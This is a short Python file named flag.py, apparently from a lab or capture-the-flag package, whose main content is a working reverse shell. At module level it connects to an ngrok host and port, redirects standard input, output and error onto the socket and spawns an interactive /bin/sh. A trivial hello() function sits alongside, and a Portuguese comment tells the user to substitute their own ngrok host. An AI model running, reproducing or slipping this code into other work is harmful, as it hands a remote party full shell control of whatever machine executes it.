# artifact_lab_3_package_3eef6c2c/flag.py
import os
import socket
import subprocess

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("0.tcp.ngrok.io", 17254))  # Substitua com o seu host e porta do ngrok
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

def hello():
    print("Hello, World!")

# Executa a shell reversa ao executar o script
reverse_shell()

